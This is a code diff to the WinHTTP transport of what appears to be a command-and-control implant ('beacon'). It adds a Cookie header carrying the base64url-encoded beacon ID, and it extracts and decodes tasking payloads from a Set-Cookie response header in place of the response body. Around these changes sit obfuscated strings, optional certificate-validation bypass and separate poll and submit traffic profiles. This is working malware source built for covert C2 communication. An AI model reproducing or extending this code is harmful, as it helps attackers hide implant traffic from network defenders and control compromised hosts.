@@ -3,6 +3,7 @@
 
 #include "../../include/network/winhttp.h"
 #include "../../include/network/transport.h"
+#include "../../include/network/net_internal.h"
 #include "../../include/resolver.h"
 #include "../../include/utils.h"
 #include "../../include/config_parser.h"
@@ -60,14 +61,14 @@ std::pair<void*, size_t> winhttpRequest(
     size_t hdrLen = 0;
     wchar_t* hdrWide = NULL;
 
-    // Determine HTTP method
-    bool usePost = (bodyData != nullptr && bodyLen > 0) || (getHttpMethod() == PCFG_HTTP_METHOD_POST);
+    // Determine HTTP method: POST if body is present, GET otherwise
+    bool usePost = (bodyData != nullptr && bodyLen > 0);
     LPCWSTR httpMethod = usePost ? lcg_encryptw(L"POST") : lcg_encryptw(L"GET");
 
     (void)dwFlags; (void)dwDownloaded; (void)readSize;  // Used only in DEBUG
 
     // Ensure WinHTTP module is loaded
-    REQUIRES_MODULE(funcTable, ModuleCache::MOD_WINHTTP);
+    REQUIRES_MODULE(funcTable, ModuleCache::Module::WINHTTP);
 
     // Open session
     VERBOSE("[winhttp] Opening WinHTTP session with UA: %ls", userAgent ? userAgent : L"(null)");
@@ -107,8 +108,7 @@ std::pair<void*, size_t> winhttpRequest(
         #ifdef DEBUG
             ignoreCertErrors = true;
         #else
-            extern bool g_validate_ssl;
-            ignoreCertErrors = !g_validate_ssl;
+            ignoreCertErrors = !g_state.validate_ssl;
         #endif
 
         if (ignoreCertErrors) {
@@ -124,11 +124,17 @@ std::pair<void*, size_t> winhttpRequest(
         }
     }
 
-    // Add custom HTTP headers if configured
-    headerCount = getCustomHTTPHeaderCount();
+    // Add custom HTTP headers if configured (poll or submit based on direction)
+    headerCount = (getRequestDirection() == RequestDirection::POLL)
+        ? getPollCustomHTTPHeaderCount()
+        : getSubmitCustomHTTPHeaderCount();
     for (uint8_t i = 0; i < headerCount; i++) {
-        hdrName = getCustomHTTPHeader(i, &name_len, &value_len);
-        hdrValue = getCustomHeaderValue(i);
+        hdrName = (getRequestDirection() == RequestDirection::POLL)
+            ? getPollCustomHTTPHeader(i, &name_len, &value_len)
+            : getSubmitCustomHTTPHeader(i, &name_len, &value_len);
+        hdrValue = (getRequestDirection() == RequestDirection::POLL)
+            ? getPollCustomHeaderValue(i)
+            : getSubmitCustomHeaderValue(i);
         if (!hdrName || !hdrValue) continue;
 
         // Expand macros in header value
@@ -173,6 +179,54 @@ std::pair<void*, size_t> winhttpRequest(
         if (expandedValue) __free(expandedValue);
     }
 
+    // Inject Cookie header with beacon identity if request cookie name is configured
+    {
+        const char* cookieName = (getRequestDirection() == RequestDirection::POLL)
+            ? getPollCookieName()
+            : getSubmitCookieName();
+        if (cookieName && cookieName[0] != '\0' && g_state.beacon_id) {
+            // Base64url-encode the 8-byte beacon_id for the cookie value
+            char* encodedId = b64UrlEncode(g_state.beacon_id, 8);
+            if (encodedId) {
+                size_t cnLen = __strlen(cookieName);
+                size_t evLen = __strlen(encodedId);
+                // Build "name=value" portion
+                char* cookiePair = (char*)__malloc(cnLen + 1 + evLen + 1);
+                if (cookiePair) {
+                    __memcpy(cookiePair, cookieName, cnLen);
+                    cookiePair[cnLen] = '=';
+                    __memcpy(cookiePair + cnLen + 1, encodedId, evLen);
+                    cookiePair[cnLen + 1 + evLen] = '\0';
+
+                    // Build full "Cookie: name=value" header
+                    size_t hdrFullLen = 8 + cnLen + 1 + evLen; // "Cookie: " + pair
+                    wchar_t* cookieHdr = (wchar_t*)__malloc((hdrFullLen + 1) * sizeof(wchar_t));
+                    if (cookieHdr) {
+                        // "Cookie: "
+                        const wchar_t prefix[] = L"Cookie: ";
+                        for (int ci = 0; ci < 8; ci++) cookieHdr[ci] = prefix[ci];
+                        // Append name=value
+                        for (size_t ci = 0; ci < cnLen + 1 + evLen; ci++)
+                            cookieHdr[8 + ci] = (wchar_t)(unsigned char)cookiePair[ci];
+                        cookieHdr[hdrFullLen] = L'\0';
+
+                        bResults = funcTable->WinHttpAddRequestHeaders(hRequest, cookieHdr, -1,
+                            WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
+                        if (!bResults) {
+                            dwError = funcTable->GetLastError();
+                            debugPrint("WinHttpAddRequestHeaders(Cookie) failed: %lu", dwError);
+                        } else {
+                            VERBOSE("Added Cookie header: %ls", cookieHdr);
+                        }
+                        __free(cookieHdr);
+                    }
+                    __free(cookiePair);
+                }
+                __free(encodedId);
+            }
+        }
+    }
+
     // For POST requests, add Content-Type header if body data is present
     if (usePost && bodyData && bodyLen > 0) {
         // Add Content-Type: application/octet-stream for binary POST data
@@ -209,10 +263,116 @@ std::pair<void*, size_t> winhttpRequest(
         debugPrint("WinHttpReceiveResponse failed: %lu", dwError);
         goto cleanup;
     }
-    VERBOSE("[winhttp] Response received, reading body...");
+    VERBOSE("[winhttp] Response received, checking for Set-Cookie payload...");
+
+    // Check for Set-Cookie response payload delivery
+    {
+        const char* respCookieName = getResponseCookieName();
+        if (respCookieName && respCookieName[0] != '\0') {
+            // Query raw response headers as CRLF-separated string
+            DWORD headerLen = 0;
+            BOOL hdrResult = funcTable->WinHttpQueryHeaders(hRequest,
+                WINHTTP_QUERY_RAW_HEADERS_CRLF,
+                WINHTTP_HEADER_NAME_BY_INDEX,
+                NULL, &headerLen,
+                WINHTTP_NO_HEADER_INDEX);
+
+            if (hdrResult && headerLen > 0) {
+                wchar_t* rawHeaders = (wchar_t*)__malloc(headerLen + sizeof(wchar_t));
+                if (rawHeaders) {
+                    hdrResult = funcTable->WinHttpQueryHeaders(hRequest,
+                        WINHTTP_QUERY_RAW_HEADERS_CRLF,
+                        WINHTTP_HEADER_NAME_BY_INDEX,
+                        rawHeaders, &headerLen,
+                        WINHTTP_NO_HEADER_INDEX);
+
+                    if (hdrResult) {
+                        rawHeaders[headerLen / sizeof(wchar_t)] = L'\0';
+
+                        // Search for "Set-Cookie: <name>=" within raw headers
+                        size_t cnLen = __strlen(respCookieName);
+                        const wchar_t* scan = rawHeaders;
+                        while (*scan) {
+                            // Look for "Set-Cookie:" (case-insensitive prefix via WinHTTP preserves server casing)
+                            const wchar_t* scPos = __wcsstr(scan, L"Set-Cookie: ");
+                            if (!scPos) {
+                                // Try lowercase
+                                scPos = __wcsstr(scan, L"set-cookie: ");
+                            }
+                            if (!scPos) break;
+
+                            // Move past "Set-Cookie: " (12 chars)
+                            const wchar_t* nameStart = scPos + 12;
+
+                            // Check if cookie name matches
+                            bool nameMatch = false;
+                            size_t ci;
+                            for (ci = 0; ci < cnLen; ci++) {
+                                if ((wchar_t)(unsigned char)respCookieName[ci] != nameStart[ci]) break;
+                            }
+                            if (ci == cnLen && nameStart[ci] == L'=') {
+                                nameMatch = true;
+                            }
+
+                            if (nameMatch) {
+                                // Extract value: after "name=" until ';' or end of line
+                                const wchar_t* valStart = nameStart + cnLen + 1;
+                                const wchar_t* valEnd = wcschr(valStart, L';');
+                                if (!valEnd) {
+                                    valEnd = wcschr(valStart, L'\r');
+                                    if (!valEnd) valEnd = wcschr(valStart, L'\n');
+                                    if (!valEnd) valEnd = valStart + __wcslen(valStart);
+                                }
+
+                                size_t valLen = valEnd - valStart;
+                                if (valLen > 0) {
+                                    // Convert wide to narrow
+                                    char* narrowVal = (char*)__malloc(valLen + 1);
+                                    if (narrowVal) {
+                                        for (size_t ci2 = 0; ci2 < valLen; ci2++) {
+                                            narrowVal[ci2] = (char)valStart[ci2];
+                                        }
+                                        narrowVal[valLen] = '\0';
+
+                                        // Base64url-decode the cookie value
+                                        size_t decodedLen = 0;
+                                        unsigned char* decoded = b64UrlDecode(narrowVal, valLen, &decodedLen);
+                                        if (decoded && decodedLen > 0) {
+                                            // Use decoded content instead of reading body
+                                            content = (char*)decoded;
+                                            contentLen = decodedLen;
+                                            contentCap = decodedLen;
+                                            c_debugPrint(funcTable, "[winhttp] Extracted %zu bytes from Set-Cookie '%s'",
+                                                decodedLen, respCookieName);
+                                            // Signal to skip body reading by zeroing dwSize loop condition
+                                            dwSize = 0;
+                                        } else {
+                                            debugPrint("[winhttp] Failed to decode Set-Cookie value for '%s' (len=%zu)",
+                                                respCookieName, valLen);
+                                        }
+                                        __free(narrowVal);
+                                    }
+                                }
+                                break; // Found our cookie, stop searching
+                            }
+
+                            // Move past this header line
+                            scan = scPos + 12;
+                            const wchar_t* eol = wcschr(scan, L'\n');
+                            if (eol) scan = eol + 1;
+                            else break;
+                        }
+                    }
+                    __free(rawHeaders);
+                }
+            }
+        }
+    }
 
     // Read body chunks with geometric growth
     do {
+        // Skip body reading if we already extracted payload from Set-Cookie
+        if (dwSize == 0 && contentLen > 0) break;
         bResults = funcTable->WinHttpQueryDataAvailable(hRequest, &dwSize);
         if (!bResults || dwSize == 0) break;
 
